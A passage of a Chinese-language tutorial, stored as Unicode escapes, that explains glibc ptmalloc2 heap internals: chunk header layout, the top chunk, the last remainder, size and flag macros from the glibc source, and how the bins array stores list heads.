\u7a7a\u95f2\u65f6\uff0c\u4f1a\u88ab\u6dfb\u52a0\u5230\u5bf9\u5e94\u7684\u7a7a\u95f2\u7ba1\u7406\u94fe\u8868\u4e2d\uff0c\u5176\u5b57\u6bb5\u7684\u542b\u4e49\u5982\u4e0b fd \u6307\u5411\u4e0b\u4e00\u4e2a\uff08\u975e\u7269\u7406\u76f8\u90bb\uff09\u7a7a\u95f2\u7684 chunk bk \u6307\u5411\u4e0a\u4e00\u4e2a\uff08\u975e\u7269\u7406\u76f8\u90bb\uff09\u7a7a\u95f2\u7684 chunk \u901a\u8fc7 fd \u548c bk \u53ef\u4ee5\u5c06\u7a7a\u95f2\u7684 chunk \u5757\u52a0\u5165\u5230\u7a7a\u95f2\u7684 chunk \u5757\u94fe\u8868\u8fdb\u884c\u7edf\u4e00\u7ba1\u7406 fd_nextsize\uff0c bk_nextsize \u4e5f\u662f\u53ea\u6709 chunk \u7a7a\u95f2\u7684\u65f6\u5019\u624d\u4f7f\u7528\uff0c\u4e0d\u8fc7\u5176\u7528\u4e8e\u8f83\u5927\u7684 chunk\uff08large chunk\uff09\u3002 fd_nextsize \u6307\u5411\u524d\u4e00\u4e2a\u4e0e\u5f53\u524d chunk \u5927\u5c0f\u4e0d\u540c\u7684\u7b2c\u4e00\u4e2a\u7a7a\u95f2\u5757\uff0c\u4e0d\u5305\u542b bin \u7684\u5934\u6307\u9488\u3002 bk_nextsize \u6307\u5411\u540e\u4e00\u4e2a\u4e0e\u5f53\u524d chunk \u5927\u5c0f\u4e0d\u540c\u7684\u7b2c\u4e00\u4e2a\u7a7a\u95f2\u5757\uff0c\u4e0d\u5305\u542b bin \u7684\u5934\u6307\u9488\u3002 \u4e00\u822c\u7a7a\u95f2\u7684 large chunk \u5728 fd \u7684\u904d\u5386\u987a\u5e8f\u4e2d\uff0c\u6309\u7167\u7531\u5927\u5230\u5c0f\u7684\u987a\u5e8f\u6392\u5217\u3002 \u8fd9\u6837\u505a\u53ef\u4ee5\u907f\u514d\u5728\u5bfb\u627e\u5408\u9002 chunk \u65f6\u6328\u4e2a\u904d\u5386\u3002 \u4e00\u4e2a\u5df2\u7ecf\u5206\u914d\u7684 chunk \u7684\u6837\u5b50\u5982\u4e0b\u3002 \u6211\u4eec\u79f0\u524d\u4e24\u4e2a\u5b57\u6bb5\u79f0\u4e3a chunk header\uff0c\u540e\u9762\u7684\u90e8\u5206\u79f0\u4e3a user data\u3002\u6bcf\u6b21 malloc \u7533\u8bf7\u5f97\u5230\u7684\u5185\u5b58\u6307\u9488\uff0c\u5176\u5b9e\u6307\u5411 user data \u7684\u8d77\u59cb\u5904\u3002 \u5f53\u4e00\u4e2a chunk \u5904\u4e8e\u4f7f\u7528\u72b6\u6001\u65f6\uff0c\u5b83\u7684\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u57df\u65e0\u6548\uff0c\u6240\u4ee5\u4e0b\u4e00\u4e2a chunk \u7684\u8be5\u90e8\u5206\u4e5f\u53ef\u4ee5\u88ab\u5f53\u524d chunk \u4f7f\u7528\u3002 \u8fd9\u5c31\u662f chunk \u4e2d\u7684\u7a7a\u95f4\u590d\u7528\u3002 \u5df2\u7ecf\u88ab\u5206\u914d\u4f7f\u7528\u7684 chunk \u7ed3\u6784\u5982\u4e0b\u4e24\u4e2a\u56fe\uff1a\uff08\u56fe\u4e00\u56fe\u4e8c size \u4f4d A \u4e0e N \u76f8\u540c\u542b\u4e49\u53ea\u662f\u8868\u793a\u4e0d\u540c\uff09 chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if unallocated ( P clear ) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk, in bytes | A | M | P | mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | User data starts here... . . . . ( malloc_usable_size () bytes ) . next . | chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | ( size of chunk, but used for application data ) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk, in bytes | A | 0 | 1 | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ free_chunk \u00b6 \u88ab\u91ca\u653e\u7684 chunk \u88ab\u8bb0\u5f55\u5728\u94fe\u8868\u4e2d\uff08\u53ef\u80fd\u662f\u5faa\u73af\u53cc\u5411\u94fe\u8868\uff0c\u4e5f\u53ef\u80fd\u662f\u5355\u5411\u94fe\u8868\uff09\u3002\u5177\u4f53\u7ed3\u6784\u5982\u4e0b\uff1a chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if unallocated ( P clear ) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ ` head: ' | Size of chunk, in bytes |A|0|P| mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Forward pointer to next chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Back pointer to previous chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Unused space (may be 0 bytes long) . . . next . | chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ `foot:' | Size of chunk, in bytes | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk, in bytes | A | 0 | 0 | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ \u53ef\u4ee5\u53d1\u73b0\uff0c\u5982\u679c\u4e00\u4e2a chunk \u5904\u4e8e free \u72b6\u6001\uff0c\u90a3\u4e48\u4f1a\u6709\u4e24\u4e2a\u4f4d\u7f6e\u8bb0\u5f55\u5176\u76f8\u5e94\u7684\u5927\u5c0f \u672c\u8eab\u7684 size \u5b57\u6bb5\u4f1a\u8bb0\u5f55\u3002\uff08\u56fe\u4e2d\u6700\u540e\u4e00\u884c size \u4f4d\uff09 \u5b83\u540e\u9762\u7684 chunk \u4f1a\u8bb0\u5f55\u3002\uff08\u56fe\u4e2d\u5012\u6570\u7b2c\u4e8c\u884c nextchunk \u7684 prevsize \u4f4d\uff09 \u4e00\u822c\u60c5\u51b5\u4e0b \uff08fastbin\u4e2d\u5b58\u5728\u7279\u4f8b\uff09\uff0c\u7269\u7406\u76f8\u90bb\u7684\u4e24\u4e2a\u7a7a\u95f2 chunk \u4f1a\u88ab\u5408\u5e76\u4e3a\u4e00\u4e2a chunk \u3002\u5806\u7ba1\u7406\u5668\u4f1a\u901a\u8fc7 prev_size \u5b57\u6bb5\u4ee5\u53ca size \u5b57\u6bb5\u5408\u5e76\u4e24\u4e2a\u7269\u7406\u76f8\u90bb\u7684\u7a7a\u95f2 chunk \u5757\u3002 \uff01\uff01\uff01\u4e00\u4e9b\u5173\u4e8e\u5806\u7684\u7ea6\u675f\uff0c\u540e\u9762\u8be6\u7ec6\u8003\u8651\uff01\uff01\uff01 /* The three exceptions to all this are: 1. The special chunk `top' doesn't bother using the trailing size field since there is no next contiguous chunk that would have to index off it. After initialization, `top' is forced to always exist. If it would become less than MINSIZE bytes long, it is replenished. 2. Chunks allocated via mmap, which have the second-lowest-order bit M (IS_MMAPPED) set in their size fields. Because they are allocated one-by-one, each must contain its own trailing size field. If the M bit is set, the other bits are ignored (because mmapped chunks are neither in an arena, nor adjacent to a freed chunk). The M bit is also used for chunks which originally came from a dumped heap via malloc_set_state in hooks.c. 3. Chunks in fastbins are treated as allocated chunks from the point of view of the chunk allocator. They are consolidated with their neighbors only in bulk, in malloc_consolidate. */ top chunk \u00b6 glibc \u4e2d\u5bf9\u4e8e top chunk \u7684\u63cf\u8ff0\u5982\u4e0b /* Top The top-most available chunk (i.e., the one bordering the end of available memory) is treated specially. It is never included in any bin, is used only if no other chunk is available, and is released back to the system if it is very large (see M_TRIM_THRESHOLD). Because top initially points to its own bin with initial zero size, thus forcing extension on the first malloc request, we avoid having any special code in malloc to check whether it even exists yet. But we still need to do so when getting memory from system, so we make initial_top treat the bin as a legal but unusable chunk during the interval between initialization and the first call to sysmalloc. (This is somewhat delicate, since it relies on the 2 preceding words to be zero during this interval as well.) */ /* Conveniently, the unsorted bin can be used as dummy top on first call */ #define initial_top(M) (unsorted_chunks(M)) \u7a0b\u5e8f\u7b2c\u4e00\u6b21\u8fdb\u884c malloc \u7684\u65f6\u5019\uff0cheap \u4f1a\u88ab\u5206\u4e3a\u4e24\u5757\uff0c\u4e00\u5757\u7ed9\u7528\u6237\uff0c\u5269\u4e0b\u7684\u90a3\u5757\u5c31\u662f top chunk\u3002\u5176\u5b9e\uff0c\u6240\u8c13\u7684 top chunk \u5c31\u662f\u5904\u4e8e\u5f53\u524d\u5806\u7684\u7269\u7406\u5730\u5740\u6700\u9ad8\u7684 chunk\u3002 top chunk \u4e0d\u5c5e\u4e8e\u4efb\u4f55\u4e00\u4e2a bin \uff0c\u5b83\u7684\u4f5c\u7528\u5728\u4e8e\u5f53\u6240\u6709\u7684 bin \u90fd\u65e0\u6cd5\u6ee1\u8db3\u7528\u6237\u8bf7\u6c42\u7684\u5927\u5c0f\u65f6\uff0c\u5982\u679c top chunk \u5927\u5c0f\u4e0d\u5c0f\u4e8e\u7528\u6237\u8bf7\u6c42\u7684\u5927\u5c0f\uff0c\u5c31\u5c06\u8be5 top chunk \u5206\u4f5c\u4e24\u90e8\u5206\uff1a\u7528\u6237\u8bf7\u6c42\u7684 chunk \u548c \u5269\u4f59\u7684\u90e8\u5206\uff08\u6210\u4e3a\u65b0\u7684 top chunk \uff09\u3002\u5426\u5219\uff0c\u5c31\u5bf9 heap \u8fdb\u884c\u6269\u5c55\u540e\u518d\u8fdb\u884c\u5206\u914d\u3002\u5728 main arena \u4e2d\u901a\u8fc7 sbrk \u6269\u5c55 heap \uff0c\u800c\u5728*thread arena* \u4e2d\u901a\u8fc7 mmap \u5206\u914d\u65b0\u7684 heap \u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0ctop chunk \u7684 prev_inuse \u6bd4\u7279\u4f4d\u59cb\u7ec8\u4e3a 1\uff0c\u5426\u5219\u5176\u524d\u9762\u7684 chunk \u5c31\u4f1a\u88ab\u5408\u5e76\u5230 top chunk \u4e2d\u3002 \u521d\u59cb\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06 unsorted chunk \u4f5c\u4e3a top chunk\u3002 last remainder \u00b6 \u5728\u7528\u6237\u4f7f\u7528 malloc \u8bf7\u6c42\u5206\u914d\u5185\u5b58\u65f6\uff0cptmalloc2 \u627e\u5230\u7684 chunk \uff08bin\u4e2d\u7684chunk\uff09\u53ef\u80fd\u5e76\u4e0d\u548c\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4e00\u81f4\uff0c\u8fd9\u65f6\u5019\u5c31\u5c06\u5206\u5272\u4e4b\u540e\u7684\u5269\u4f59\u90e8\u5206\u79f0\u4e4b\u4e3a last remainder chunk \uff0cunsort bin \u4e5f\u4f1a\u5b58\u8fd9\u4e00\u5757\u3002top chunk \u5206\u5272\u5269\u4e0b\u7684\u90e8\u5206\u4e0d\u4f1a\u4f5c\u4e3a last remainder\u3002 chunk \u76f8\u5173\u5b8f \u00b6 \u8fd9\u91cc\u4e3b\u8981\u4ecb\u7ecd chunk \u7684\u5927\u5c0f\u3001\u5bf9\u9f50\u68c0\u67e5\u4ee5\u53ca\u4e00\u4e9b\u8f6c\u6362\u7684\u5b8f\u3002 chunk \u4e0e mem \u6307\u9488\u5934\u90e8\u7684\u8f6c\u6362 mem \u6307\u5411\u7528\u6237\u5f97\u5230\u7684\u5185\u5b58\u7684\u8d77\u59cb\u4f4d\u7f6e\u3002 /* conversion from malloc headers to user pointers, and back */ #define chunk2mem(p) ((void *) ((char *) (p) + 2 * SIZE_SZ)) #define mem2chunk(mem) ((mchunkptr)((char *) (mem) -2 * SIZE_SZ)) \u6700\u5c0f\u7684 chunk \u5927\u5c0f /* The smallest possible chunk */ #define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize)) \u8fd9\u91cc\uff0coffsetof \u51fd\u6570\u8ba1\u7b97\u51fa fd_nextsize \u5728 malloc_chunk \u4e2d\u7684\u504f\u79fb\uff0c\u8bf4\u660e\u6700\u5c0f\u7684 chunk \u81f3\u5c11\u8981\u5305\u542b bk \u6307\u9488\u3002 \u6700\u5c0f\u7533\u8bf7\u7684\u5806\u5185\u5b58\u5927\u5c0f \u7528\u6237\u6700\u5c0f\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u5fc5\u987b\u662f 2 * SIZE_SZ \u7684\u6700\u5c0f\u6574\u6570\u500d\u3002 \u6ce8\uff1a\u5c31\u76ee\u524d\u800c\u770b MIN_CHUNK_SIZE \u548c MINSIZE \u5927\u5c0f\u662f\u4e00\u81f4\u7684\uff0c\u4e2a\u4eba\u8ba4\u4e3a\u4e4b\u6240\u4ee5\u8981\u6dfb\u52a0\u4e24\u4e2a\u5b8f\u662f\u4e3a\u4e86\u65b9\u4fbf\u4ee5\u540e\u4fee\u6539 malloc_chunk \u65f6\u65b9\u4fbf\u4e00\u4e9b\u3002 /* The smallest size we can malloc is an aligned minimal chunk */ //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 #define MINSIZE \\ (unsigned long) (((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) & \\ ~MALLOC_ALIGN_MASK)) \u68c0\u67e5\u5206\u914d\u7ed9\u7528\u6237\u7684\u5185\u5b58\u662f\u5426\u5bf9\u9f50 2 * SIZE_SZ \u5927\u5c0f\u5bf9\u9f50\u3002 /* Check if m has acceptable alignment */ // MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 #define aligned_OK(m) (((unsigned long) (m) & MALLOC_ALIGN_MASK) == 0) #define misaligned_chunk(p) \\ ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) & \\ MALLOC_ALIGN_MASK) \u8bf7\u6c42\u5b57\u8282\u6570\u5224\u65ad /* Check if a request is so large that it would wrap around zero when padded and aligned. To simplify some other code, the bound is made low enough so that adding MINSIZE will also not wrap around zero. */ #define REQUEST_OUT_OF_RANGE(req) \\ ((unsigned long) (req) >= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE)) \u5c06\u7528\u6237\u8bf7\u6c42\u5185\u5b58\u5927\u5c0f\u8f6c\u4e3a\u5b9e\u9645\u5206\u914d\u5185\u5b58\u5927\u5c0f /* pad request bytes into a usable size -- internal version */ //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 #define request2size(req) \\ (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE) \\ ? MINSIZE \\ : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK) /* Same, except also perform argument check */ #define checked_request2size(req, sz) \\ if (REQUEST_OUT_OF_RANGE(req)) { \\ __set_errno(ENOMEM); \\ return 0; \\ } \\ (sz) = request2size(req); \u5f53\u4e00\u4e2a chunk \u5904\u4e8e\u5df2\u5206\u914d\u72b6\u6001\u65f6\uff0c\u5b83\u7684\u7269\u7406\u76f8\u90bb\u7684\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u5b57\u6bb5\u5fc5\u7136\u662f\u65e0\u6548\u7684\uff0c\u6545\u800c\u8fd9\u4e2a\u5b57\u6bb5\u5c31\u53ef\u4ee5\u88ab\u5f53\u524d\u8fd9\u4e2a chunk \u4f7f\u7528\u3002\u8fd9\u5c31\u662f ptmalloc \u4e2d chunk \u95f4\u7684\u590d\u7528\u3002\u5177\u4f53\u6d41\u7a0b\u5982\u4e0b \u9996\u5148\uff0c\u5229\u7528 REQUEST_OUT_OF_RANGE \u5224\u65ad\u662f\u5426\u53ef\u4ee5\u5206\u914d\u7528\u6237\u8bf7\u6c42\u7684\u5b57\u8282\u5927\u5c0f\u7684 chunk\u3002 \u5176\u6b21\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u7528\u6237\u8bf7\u6c42\u7684\u5b57\u8282\u662f\u7528\u6765\u5b58\u50a8\u6570\u636e\u7684\uff0c\u5373 chunk header \u540e\u9762\u7684\u90e8\u5206\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u7531\u4e8e chunk \u95f4\u590d\u7528\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u5b57\u6bb5\u3002\u56e0\u6b64\uff0c\u8fd9\u91cc\u53ea\u9700\u8981\u518d\u6dfb\u52a0 SIZE_SZ \u5927\u5c0f\u5373\u53ef\u4ee5\u5b8c\u5168\u5b58\u50a8\u5185\u5bb9\u3002 \u7531\u4e8e\u7cfb\u7edf\u4e2d\u6240\u5141\u8bb8\u7684\u7533\u8bf7\u7684 chunk \u6700\u5c0f\u662f MINSIZE\uff0c\u6240\u4ee5\u4e0e\u5176\u8fdb\u884c\u6bd4\u8f83\u3002\u5982\u679c\u4e0d\u6ee1\u8db3\u6700\u4f4e\u8981\u6c42\uff0c\u90a3\u4e48\u5c31\u9700\u8981\u76f4\u63a5\u5206\u914d MINSIZE \u5b57\u8282\u3002 \u5982\u679c\u5927\u4e8e\u7684\u8bdd\uff0c\u56e0\u4e3a\u7cfb\u7edf\u4e2d\u7533\u8bf7\u7684 chunk \u9700\u8981 2 * SIZE_SZ \u5bf9\u9f50\uff0c\u6240\u4ee5\u8fd9\u91cc\u9700\u8981\u52a0\u4e0a MALLOC_ALIGN_MASK \u4ee5\u4fbf\u4e8e\u5bf9\u9f50\u3002 \u4e2a\u4eba\u8ba4\u4e3a\uff0c\u8fd9\u91cc\u5728 request2size \u7684\u5b8f\u7684\u7b2c\u4e00\u884c\u4e2d\u6ca1\u6709\u5fc5\u8981\u52a0\u4e0a MALLOC_ALIGN_MASK\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u901a\u8fc7\u8fd9\u6837\u7684\u8ba1\u7b97\u516c\u5f0f\u5f97\u5230\u7684 size \u6700\u7ec8\u4e00\u5b9a\u662f\u6ee1\u8db3\u7528\u6237\u9700\u8981\u7684\u3002 \u6807\u8bb0\u4f4d\u76f8\u5173 /* size field is or'ed with PREV_INUSE when previous adjacent chunk in use */ #define PREV_INUSE 0x1 /* extract inuse bit of previous chunk */ #define prev_inuse(p) ((p)->mchunk_size & PREV_INUSE) /* size field is or'ed with IS_MMAPPED if the chunk was obtained with mmap() */ #define IS_MMAPPED 0x2 /* check for mmap()'ed chunk */ #define chunk_is_mmapped(p) ((p)->mchunk_size & IS_MMAPPED) /* size field is or'ed with NON_MAIN_ARENA if the chunk was obtained from a non-main arena. This is only set immediately before handing the chunk to the user, if necessary. */ #define NON_MAIN_ARENA 0x4 /* Check for chunk from main arena. */ #define chunk_main_arena(p) (((p)->mchunk_size & NON_MAIN_ARENA) == 0) /* Mark a chunk as not being on the main arena. */ #define set_non_main_arena(p) ((p)->mchunk_size |= NON_MAIN_ARENA) /* Bits to mask off when extracting size Note: IS_MMAPPED is intentionally not masked off from size field in macros for which mmapped chunks should never be seen. This should cause helpful core dumps to occur if it is tried by accident by people extending or adapting this malloc. */ #define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) \u83b7\u53d6 chunk size /* Get size, ignoring use bits */ #define chunksize(p) (chunksize_nomask(p) & ~(SIZE_BITS)) /* Like chunksize, but do not mask SIZE_BITS. */ #define chunksize_nomask(p) ((p)->mchunk_size) \u83b7\u53d6\u4e0b\u4e00\u4e2a\u7269\u7406\u76f8\u90bb\u7684 chunk /* Ptr to next physical malloc_chunk. */ #define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p))) \u83b7\u53d6\u524d\u4e00\u4e2a chunk \u7684\u4fe1\u606f /* Size of the chunk below P. Only valid if !prev_inuse (P). */ #define prev_size(p) ((p)->mchunk_prev_size) /* Set the size of the chunk below P. Only valid if !prev_inuse (P). */ #define set_prev_size(p, sz) ((p)->mchunk_prev_size = (sz)) /* Ptr to previous physical malloc_chunk. Only valid if !prev_inuse (P). */ #define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p))) \u5f53\u524d chunk \u4f7f\u7528\u72b6\u6001\u76f8\u5173\u64cd\u4f5c /* extract p's inuse bit */ #define inuse(p) \\ ((((mchunkptr)(((char *) (p)) + chunksize(p)))->mchunk_size) & PREV_INUSE) /* set/clear chunk as being inuse without otherwise disturbing */ #define set_inuse(p) \\ ((mchunkptr)(((char *) (p)) + chunksize(p)))->mchunk_size |= PREV_INUSE #define clear_inuse(p) \\ ((mchunkptr)(((char *) (p)) + chunksize(p)))->mchunk_size &= ~(PREV_INUSE) \u8bbe\u7f6e chunk \u7684 size \u5b57\u6bb5 /* Set size at head, without disturbing its use bit */ // SIZE_BITS = 7 #define set_head_size(p, s) \\ ((p)->mchunk_size = (((p)->mchunk_size & SIZE_BITS) | (s))) /* Set size/use field */ #define set_head(p, s) ((p)->mchunk_size = (s)) /* Set size at footer (only when chunk is not in use) */ #define set_foot(p, s) \\ (((mchunkptr)((char *) (p) + (s)))->mchunk_prev_size = (s)) \u83b7\u53d6\u6307\u5b9a\u504f\u79fb\u7684 chunk /* Treat space at ptr + offset as a chunk */ #define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s))) \u6307\u5b9a\u504f\u79fb\u5904 chunk \u4f7f\u7528\u72b6\u6001\u76f8\u5173\u64cd\u4f5c /* check/set/clear inuse bits in known places */ #define inuse_bit_at_offset(p, s) \\ (((mchunkptr)(((char *) (p)) + (s)))->mchunk_size & PREV_INUSE) #define set_inuse_bit_at_offset(p, s) \\ (((mchunkptr)(((char *) (p)) + (s)))->mchunk_size |= PREV_INUSE) #define clear_inuse_bit_at_offset(p, s) \\ (((mchunkptr)(((char *) (p)) + (s)))->mchunk_size &= ~(PREV_INUSE)) bin \u4ecb\u7ecd \u00b6 \u6982\u8ff0 \u00b6 \u6211\u4eec\u66fe\u7ecf\u8bf4\u8fc7\uff0c\u7528\u6237\u91ca\u653e\u6389\u7684 chunk \u4e0d\u4f1a\u9a6c\u4e0a\u5f52\u8fd8\u7ed9\u7cfb\u7edf\uff0cptmalloc \u4f1a\u7edf\u4e00\u7ba1\u7406 heap \u548c mmap \u6620\u5c04\u533a\u57df\u4e2d\u7684\u7a7a\u95f2\u7684 chunk\u3002\u5f53\u7528\u6237\u518d\u4e00\u6b21\u8bf7\u6c42\u5206\u914d\u5185\u5b58\u65f6\uff0cptmalloc \u5206\u914d\u5668\u4f1a\u8bd5\u56fe\u5728\u7a7a\u95f2\u7684 chunk \u4e2d\u6311\u9009\u4e00\u5757\u5408\u9002\u7684\u7ed9\u7528\u6237\u3002\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u9891\u7e41\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u964d\u4f4e\u5185\u5b58\u5206\u914d\u7684\u5f00\u9500\u3002 \u5728\u5177\u4f53\u7684\u5b9e\u73b0\u4e2d\uff0cptmalloc \u91c7\u7528\u5206\u7bb1\u5f0f\u65b9\u6cd5\u5bf9\u7a7a\u95f2\u7684 chunk \u8fdb\u884c\u7ba1\u7406\u3002\u9996\u5148\uff0c\u5b83\u4f1a\u6839\u636e\u7a7a\u95f2\u7684 chunk \u7684\u5927\u5c0f\u4ee5\u53ca\u4f7f\u7528\u72b6\u6001\u5c06 chunk \u521d\u6b65\u5206\u4e3a 4 \u7c7b\uff1afast bins\uff0csmall bins\uff0clarge bins\uff0cunsorted bin\u3002\u6bcf\u7c7b\u4e2d\u4ecd\u7136\u6709\u66f4\u7ec6\u7684\u5212\u5206\uff0c\u76f8\u4f3c\u5927\u5c0f\u7684 chunk \u4f1a\u7528\u53cc\uff08\u5355\uff09\u5411\u94fe\u8868\u94fe\u63a5\u8d77\u6765\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728\u6bcf\u7c7b bin \u7684\u5185\u90e8\u4ecd\u7136\u4f1a\u6709\u591a\u4e2a\u4e92\u4e0d\u76f8\u5173\u7684\u94fe\u8868\u6765\u4fdd\u5b58\u4e0d\u540c\u5927\u5c0f\u7684 chunk \u3002 \u5bf9\u4e8e small bins\uff0clarge bins\uff0cunsorted bin \u6765\u8bf4\uff0cptmalloc \u5c06\u5b83\u4eec\u7ef4\u62a4\u5728\u540c\u4e00\u4e2a\u6570\u7ec4\u4e2d\u3002\u8fd9\u4e9b bin \u5bf9\u5e94\u7684\u6570\u636e\u7ed3\u6784\u5728 malloc_state \u4e2d\uff0c\u5982\u4e0b #define NBINS 128 /* Normal bins packed as described above */ mchunkptr bins [ NBINS * 2 - 2 ]; \u4e00\u4e2a bin \u76f8\u5f53\u4e8e\u4e00\u4e2a chunk \u94fe\u8868\uff0c\u6211\u4eec\u628a\u6bcf\u4e2a\u94fe\u8868\u7684\u5934\u8282\u70b9 chunk \u4f5c\u4e3a bins \u6570\u7ec4\uff0c\u4f46\u662f\u7531\u4e8e\u8fd9\u4e2a\u5934\u8282\u70b9\u4f5c\u4e3a bin \u8868\u5934\uff0c\u5176 prev_size \u4e0e size \u5b57\u6bb5\u662f\u6ca1\u6709\u4efb\u4f55\u5b9e\u9645\u4f5c\u7528\u7684\uff0c\u56e0\u6b64\u6211\u4eec\u5728\u5b58\u50a8\u5934\u8282\u70b9 chunk \u7684\u65f6\u5019\u4ec5\u4ec5\u53ea\u9700\u8981\u5b58\u50a8\u5934\u8282\u70b9 chunk \u7684 fd \u548c bk \u5373\u53ef\uff0c\u800c\u5176\u4e2d\u7684 prev_size \u4e0e size \u5b57\u6bb5\u88ab\u91cd\u7528\u4e3a\u53e6\u4e00\u4e2a bin \u7684\u5934\u8282\u70b9\u7684 fd \u4e0e bk\uff0c\u8fd9\u6837\u53ef\u4ee5\u8282\u7701\u7a7a\u95f4\uff0c\u5e76\u63d0\u9ad8\u53ef\u7528\u6027\u3002\u56e0\u6b64**\u6211\u4eec\u4ec5\u4ec5\u53ea\u9700\u8981 mchunkptr \u7c7b\u578b\u7684\u6307\u9488\u6570\u7ec4\u5c31\u8db3\u591f\u5b58\u50a8\u8fd9\u4e9b\u5934\u8282\u70b9**\uff0c\u90a3 prev_size \u4e0e size \u5b57\u6bb5\u5230\u5e95\u662f\u600e\u4e48\u91cd\u7528\u7684\u5462\uff1f\u8fd9\u91cc\u6211\u4eec\u4ee5 32 \u4f4d\u7cfb\u7edf\u4e3a\u4f8b \u542b\u4e49 bin1 \u7684 fd/bin2 \u7684 prev_size bin1 \u7684 bk/bin2 \u7684 size bin2 \u7684 fd/bin3 \u7684 prev_size bin2 \u7684 bk/bin3 \u7684 size bin \u4e0b\u6807 0 1 2 3 \u53ef\u4ee5\u770b\u51fa\u9664\u4e86\u7b2c\u4e00\u4e2a bin\uff08unsorted bin\uff09\u5916\uff0c\u540e\u9762\u7684\u6bcf\u4e2a bin \u7684\u8868\u5934 chunk \u4f1a\u91cd\u7528\u524d\u9762\u7684 bin \u8868\u5934 chunk \u7684 fd \u4e0e bk \u5b57\u6bb5\uff0c\u5c06\u5176\u89c6\u4e3a\u5176\u81ea\u8eab\u7684 prev_size \u548c size \u5b57\u6bb5\u3002\u8fd9\u91cc\u4e5f\u8bf4\u660e\u4e86\u4e00\u4e2a\u95ee\u9898\uff0c bin \u7684\u4e0b\u6807\u548c\u6211\u4eec\u6240\u8bf4\u7684\u7b2c\u51e0\u4e2a bin \u5e76\u4e0d\u662f\u4e00\u81f4\u7684\u3002\u540c\u65f6\uff0cbin \u8868\u5934\u7684 chunk \u5934\u8282\u70b9 \u7684 prev_size \u4e0e size \u5b57\u6bb5\u4e0d\u80fd\u968f\u4fbf\u4fee\u6539\uff0c\u56e0\u4e3a\u8fd9\u4e24\u4e2a\u5b57\u6bb5\u662f\u5176\u5b83 bin \u8868\u5934 chunk \u7684 fd \u548c bk \u5b57\u6bb5\u3002 \u6570\u7ec4\u4e2d\u7684 bin \u4f9d\u6b21\u4ecb\u7ecd\u5982\u4e0b \uff08\u7d22\u5f15\uff09\u7b2c\u4e00\u4e2a\u4e3a unsorted bin\uff0c\u5b57\u5982\u5176\u9762\uff0c\u8fd9\u91cc\u9762\u7684 chunk \u6ca1\u6709\u8fdb\u884c\u6392\u5e8f\uff0c\u5b58\u50a8\u7684 chunk \u6bd4\u8f83\u6742\u3002 \u7d22\u5f15\u4ece 2 \u5230 63 \u7684 bin \u79f0\u4e3a small bin\uff0c\u540c\u4e00\u4e2a small bin \u94fe\u8868\u4e2d\u7684 chunk \u7684\u5927\u5c0f\u76f8\u540c\u3002\u4e24\u4e2a\u76f8\u90bb\u7d22\u5f15\u7684 small bin \u94fe\u8868\u4e2d\u7684 chunk \u5927\u5c0f\u76f8\u5dee\u7684\u5b57\u8282\u6570\u4e3a 2 \u4e2a\u673a\u5668\u5b57\u957f 